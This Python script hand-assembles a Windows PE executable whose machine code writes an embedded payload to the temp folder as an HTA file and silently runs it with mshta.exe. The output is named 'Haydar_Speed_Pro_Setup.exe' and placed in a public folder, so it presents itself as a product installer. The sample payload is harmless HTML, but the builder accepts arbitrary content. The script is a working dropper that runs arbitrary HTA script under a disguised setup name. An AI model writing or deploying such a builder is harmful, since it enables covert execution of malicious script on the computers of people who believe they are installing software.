import struct
import os

def align_up(val, align):
    return (val + align - 1) & ~(align - 1)

def build_pe_executable(payload_bytes, output_path):
    IMAGE_BASE = 0x00400000
    SEC_ALIGN = 0x1000
    FILE_ALIGN = 0x200
    
    # RVA Mapping:
    # 0x1000: .text
    # 0x2000: .rdata (Imports)
    # 0x3000: .data  (Strings, buffers, payload)
    
    RVA_TEXT = 0x1000
    RVA_RDATA = 0x2000
    RVA_DATA = 0x3000
    
    # 1. Prepare .data section layout
    str_filename = b"Haydar_Speed_Pro.hta\x00"
    str_cmdprefix = b"mshta.exe \"\x00"
    str_quote = b"\"\x00"
    
    offset_filename = 0
    offset_cmdprefix = offset_filename + len(str_filename)
    offset_quote = offset_cmdprefix + len(str_cmdprefix)
    offset_temppath = align_up(offset_quote + len(str_quote), 4)
    size_temppath = 300
    offset_cmdline = offset_temppath + size_temppath
    size_cmdline = 600
    offset_written = offset_cmdline + size_cmdline
    size_written = 4
    offset_payload = align_up(offset_written + size_written, 4)
    
    data_bytes = bytearray(offset_payload + len(payload_bytes))
    data_bytes[offset_filename:offset_filename + len(str_filename)] = str_filename
    data_bytes[offset_cmdprefix:offset_cmdprefix + len(str_cmdprefix)] = str_cmdprefix
    data_bytes[offset_quote:offset_quote + len(str_quote)] = str_quote
    data_bytes[offset_payload:offset_payload + len(payload_bytes)] = payload_bytes
    
    va_filename = IMAGE_BASE + RVA_DATA + offset_filename
    va_cmdprefix = IMAGE_BASE + RVA_DATA + offset_cmdprefix
    va_quote = IMAGE_BASE + RVA_DATA + offset_quote
    va_temppath = IMAGE_BASE + RVA_DATA + offset_temppath
    va_cmdline = IMAGE_BASE + RVA_DATA + offset_cmdline
    va_written = IMAGE_BASE + RVA_DATA + offset_written
    va_payload = IMAGE_BASE + RVA_DATA + offset_payload
    payload_len = len(payload_bytes)
    
    # 2. Prepare .rdata (Import Table)
    funcs = [
        'GetTempPathA',
        'lstrcatA',
        'CreateFileA',
        'WriteFile',
        'CloseHandle',
        'WinExec',
        'ExitProcess'
    ]
    
    # In .rdata:
    # IDT (Import Directory Table): 2 entries (KERNEL32 + NULL), each 20 bytes = 40 bytes
    # IAT: (len(funcs) + 1) * 4 bytes
    # ILT: (len(funcs) + 1) * 4 bytes
    # Hint/Name table
    # DLL Name: "KERNEL32.dll\0"
    
    offset_idt = 0
    size_idt = 40
    offset_iat = offset_idt + size_idt
    size_iat = (len(funcs) + 1) * 4
    offset_ilt = offset_iat + size_iat
    size_ilt = (len(funcs) + 1) * 4
    offset_dll_name = offset_ilt + size_ilt
    dll_name = b"KERNEL32.dll\x00"
    offset_hint_names = offset_dll_name + len(dll_name)
    if offset_hint_names % 2 != 0:
        offset_hint_names += 1
        
    hint_offsets = []
    hint_data = bytearray()
    for f in funcs:
        hint_offsets.append(offset_hint_names + len(hint_data))
        # 2 bytes hint (0) + name + null
        entry = struct.pack('<H', 0) + f.encode('ascii') + b'\x00'
        if len(entry) % 2 != 0:
            entry += b'\x00'
        hint_data.extend(entry)
        
    rdata_size = offset_hint_names + len(hint_data)
    rdata_bytes = bytearray(rdata_size)
    
    # Fill IDT:
    # OriginalFirstThunk (ILT RVA), TimeDateStamp, ForwarderChain, Name RVA, FirstThunk (IAT RVA)
    rdata_bytes[0:20] = struct.pack('<IIIII', 
        RVA_RDATA + offset_ilt, 
        0, 
        0, 
        RVA_RDATA + offset_dll_name, 
        RVA_RDATA + offset_iat
    )
    # Second IDT entry is all zeros (terminator)
    
    # Fill DLL Name
    rdata_bytes[offset_dll_name:offset_dll_name + len(dll_name)] = dll_name
    
    # Fill ILT and IAT with RVA of Hint/Name entries
    for i, h_off in enumerate(hint_offsets):
        thunk = struct.pack('<I', RVA_RDATA + h_off)
        rdata_bytes[offset_ilt + i*4:offset_ilt + (i+1)*4] = thunk
        rdata_bytes[offset_iat + i*4:offset_iat + (i+1)*4] = thunk
        
    # Append hint/name data
    rdata_bytes[offset_hint_names:offset_hint_names + len(hint_data)] = hint_data
    
    # IAT Virtual Addresses for calls
    va_iat = [IMAGE_BASE + RVA_RDATA + offset_iat + i*4 for i in range(len(funcs))]
    iat_GetTempPathA = va_iat[0]
    iat_lstrcatA = va_iat[1]
    iat_CreateFileA = va_iat[2]
    iat_WriteFile = va_iat[3]
    iat_CloseHandle = va_iat[4]
    iat_WinExec = va_iat[5]
    iat_ExitProcess = va_iat[6]
    
    # 3. Build .text (x86 32-bit machine code)
    code = bytearray()
    
    # push va_temppath
    code.extend(b'\x68' + struct.pack('<I', va_temppath))
    # push 260
    code.extend(b'\x68' + struct.pack('<I', 260))
    # call [iat_GetTempPathA]
    code.extend(b'\xff\x15' + struct.pack('<I', iat_GetTempPathA))
    
    # push va_filename
    code.extend(b'\x68' + struct.pack('<I', va_filename))
    # push va_temppath
    code.extend(b'\x68' + struct.pack('<I', va_temppath))
    # call [iat_lstrcatA]
    code.extend(b'\xff\x15' + struct.pack('<I', iat_lstrcatA))
    
    # push 0 (hTemplateFile)
    code.extend(b'\x6a\x00')
    # push 0x80 (FILE_ATTRIBUTE_NORMAL)
    code.extend(b'\x68\x80\x00\x00\x00')
    # push 2 (CREATE_ALWAYS)
    code.extend(b'\x6a\x02')
    # push 0 (lpSecurityAttributes)
    code.extend(b'\x6a\x00')
    # push 0 (dwShareMode)
    code.extend(b'\x6a\x00')
    # push 0x40000000 (GENERIC_WRITE)
    code.extend(b'\x68\x00\x00\x00\x40')
    # push va_temppath
    code.extend(b'\x68' + struct.pack('<I', va_temppath))
    # call [iat_CreateFileA]
    code.extend(b'\xff\x15' + struct.pack('<I', iat_CreateFileA))
    
    # mov ebx, eax
    code.extend(b'\x89\xc3')
    # cmp ebx, -1
    code.extend(b'\x83\xfb\xff')
    # je skip_run (+64 approx, we compute displacement)
    je_offset = len(code)
    code.extend(b'\x74\x00') # placeholder
    
    # push 0 (lpOverlapped)
    code.extend(b'\x6a\x00')
    # push va_written
    code.extend(b'\x68' + struct.pack('<I', va_written))
    # push payload_len
    code.extend(b'\x68' + struct.pack('<I', payload_len))
    # push va_payload
    code.extend(b'\x68' + struct.pack('<I', va_payload))
    # push ebx (hFile)
    code.extend(b'\x53')
    # call [iat_WriteFile]
    code.extend(b'\xff\x15' + struct.pack('<I', iat_WriteFile))
    
    # push ebx
    code.extend(b'\x53')
    # call [iat_CloseHandle]
    code.extend(b'\xff\x15' + struct.pack('<I', iat_CloseHandle))
    
    # lstrcatA(szCmdLine, szCmdPrefix)
    code.extend(b'\x68' + struct.pack('<I', va_cmdprefix))
    code.extend(b'\x68' + struct.pack('<I', va_cmdline))
    code.extend(b'\xff\x15' + struct.pack('<I', iat_lstrcatA))
    
    # lstrcatA(szCmdLine, szTempPath)
    code.extend(b'\x68' + struct.pack('<I', va_temppath))
    code.extend(b'\x68' + struct.pack('<I', va_cmdline))
    code.extend(b'\xff\x15' + struct.pack('<I', iat_lstrcatA))
    
    # lstrcatA(szCmdLine, szQuote)
    code.extend(b'\x68' + struct.pack('<I', va_quote))
    code.extend(b'\x68' + struct.pack('<I', va_cmdline))
    code.extend(b'\xff\x15' + struct.pack('<I', iat_lstrcatA))
    
    # WinExec(szCmdLine, 1)
    code.extend(b'\x6a\x01')
    code.extend(b'\x68' + struct.pack('<I', va_cmdline))
    code.extend(b'\xff\x15' + struct.pack('<I', iat_WinExec))
    
    # Patch je displacement to jump right here
    skip_dest = len(code)
    code[je_offset + 1] = skip_dest - (je_offset + 2)
    
    # ExitProcess(0)
    code.extend(b'\x6a\x00')
    code.extend(b'\xff\x15' + struct.pack('<I', iat_ExitProcess))
    
    # 4. Align sections to FileAlignment & SectionAlignment
    file_hdr_size = 0x400 # 1024 bytes
    
    text_raw_size = align_up(len(code), FILE_ALIGN)
    text_virt_size = align_up(len(code), SEC_ALIGN)
    code_padded = code.ljust(text_raw_size, b'\x00')
    
    rdata_raw_size = align_up(len(rdata_bytes), FILE_ALIGN)
    rdata_virt_size = align_up(len(rdata_bytes), SEC_ALIGN)
    rdata_padded = rdata_bytes.ljust(rdata_raw_size, b'\x00')
    
    data_raw_size = align_up(len(data_bytes), FILE_ALIGN)
    data_virt_size = align_up(len(data_bytes), SEC_ALIGN)
    data_padded = data_bytes.ljust(data_raw_size, b'\x00')
    
    raw_offset_text = file_hdr_size
    raw_offset_rdata = raw_offset_text + text_raw_size
    raw_offset_data = raw_offset_rdata + rdata_raw_size
    
    image_size = RVA_DATA + data_virt_size
    
    # 5. DOS Header & Stub
    dos_header = bytearray(64)
    dos_header[0:2] = b'MZ'
    dos_header[60:64] = struct.pack('<I', 0x80)
    
    dos_stub = b'\x0e\x1f\xba\x0e\x00\xb4\x09\xcd\x21\xb8\x01\x4c\xcd\x21This program cannot be run in DOS mode.\r\r\n$\x00\x00\x00\x00\x00\x00\x00'.ljust(64, b'\x00')
    
    # 6. PE Headers
    pe_sig = b'PE\x00\x00'
    
    # COFF: Machine=i386, 3 sections, OptHeaderSize=224, chars=EXECUTABLE | 32BIT
    coff_header = struct.pack('<HHIIIHH',
        0x014c, 3, 0x67260000, 0, 0, 224, 0x0102
    )
    
    # Optional Header
    opt_header = struct.pack('<HBBIIIIIIIIIHHHHHHIIIIHHIIIIII',
        0x010B,          # Magic (PE32)
        6, 0,            # Linker version
        text_raw_size,   # SizeOfCode
        rdata_raw_size + data_raw_size, # SizeOfInitializedData
        0,               # SizeOfUninitializedData
        RVA_TEXT,        # AddressOfEntryPoint
        RVA_TEXT,        # BaseOfCode
        RVA_DATA,        # BaseOfData
        IMAGE_BASE,      # ImageBase
        SEC_ALIGN,       # SectionAlignment
        FILE_ALIGN,      # FileAlignment
        4, 0,            # Major/Minor OS version
        1, 0,            # Major/Minor Image version
        4, 0,            # Major/Minor Subsystem version
        0,               # Win32VersionValue
        image_size,      # SizeOfImage
        file_hdr_size,   # SizeOfHeaders
        0,               # CheckSum
        2,               # Subsystem: 2 (IMAGE_SUBSYSTEM_WINDOWS_GUI)
        0x8140,          # DllCharacteristics: DYNAMIC_BASE | NX_COMPAT | TERMINAL_SERVER_AWARE
        0x100000, 0x1000,# StackReserve, StackCommit
        0x100000, 0x1000,# HeapReserve, HeapCommit
        0,               # LoaderFlags
        16               # NumberOfRvaAndSizes
    )
    
    # 16 Data Directories (8 bytes each = 128 bytes)
    data_dirs = bytearray(128)
    # Entry 1: Import Table (RVA and Size)
    data_dirs[8:16] = struct.pack('<II', RVA_RDATA + offset_idt, size_idt)
    # Entry 12: IAT (RVA and Size)
    data_dirs[96:104] = struct.pack('<II', RVA_RDATA + offset_iat, size_iat)
    
    # 7. Section Headers (3 * 40 bytes)
    # .text (Code, Execute, Read)
    sec_text = struct.pack('<8sIIIIIIHHI',
        b'.text\x00\x00\x00',
        len(code), RVA_TEXT, text_raw_size, raw_offset_text,
        0, 0, 0, 0,
        0x60000020 # CNT_CODE | MEM_EXECUTE | MEM_READ
    )
    
    # .rdata (Initialized data, Read)
    sec_rdata = struct.pack('<8sIIIIIIHHI',
        b'.rdata\x00\x00',
        len(rdata_bytes), RVA_RDATA, rdata_raw_size, raw_offset_rdata,
        0, 0, 0, 0,
        0x40000040 # CNT_INITIALIZED_DATA | MEM_READ
    )
    
    # .data (Initialized data, Read, Write)
    sec_data = struct.pack('<8sIIIIIIHHI',
        b'.data\x00\x00\x00',
        len(data_bytes), RVA_DATA, data_raw_size, raw_offset_data,
        0, 0, 0, 0,
        0xC0000040 # CNT_INITIALIZED_DATA | MEM_READ | MEM_WRITE
    )
    
    # Assemble headers
    all_headers = dos_header + dos_stub + pe_sig + coff_header + opt_header + data_dirs + sec_text + sec_rdata + sec_data
    headers_padded = all_headers.ljust(file_hdr_size, b'\x00')
    
    # Assemble full PE file
    pe_file = headers_padded + code_padded + rdata_padded + data_padded
    
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    with open(output_path, 'wb') as f:
        f.write(pe_file)
        
    print(f"Successfully generated Windows PE executable: {output_path} ({len(pe_file)} bytes)")
    return len(pe_file)

if __name__ == '__main__':
    test_payload = b"<html><body><h1>Haydar Speed Pro</h1></body></html>"
    build_pe_executable(test_payload, "public/Haydar_Speed_Pro_Setup.exe")
